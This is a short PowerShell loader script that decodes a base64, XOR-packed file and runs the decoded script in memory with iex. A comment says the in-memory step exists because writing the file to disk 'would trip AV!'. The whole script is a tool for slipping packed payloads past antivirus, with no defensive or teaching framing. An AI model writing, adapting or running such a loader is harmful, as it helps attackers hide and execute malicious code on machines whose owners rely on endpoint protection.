$Input = $args[0]
$Xor_Val = $args[1]
	if ( $Input -eq $null ){
		Write-Host "Syntax is c:\path\to\packed.txt Xor_Val" }
	else {
$FilePath = Get-Location
$base64Code = [IO.File]::ReadAllText("$FilePath\$Input")
#Decode it from base64
$xoredCode = [Convert]::FromBase64String($base64Code)
#xor the file back to its original bytes
$file = $xoredCode | ForEach-Object { return $_ -bxor $Xor_Val}
#Write the decoded file to disk (this would trip AV!)
#[IO.File]::WriteAllBytes("c:\test.ps1", $file)
#If encoding a powershell script, convert the bytes back to utf8 text
$file = [text.encoding]::utf8.Getstring($file)
#Execute the powershell script in memory
iex($file)
		}
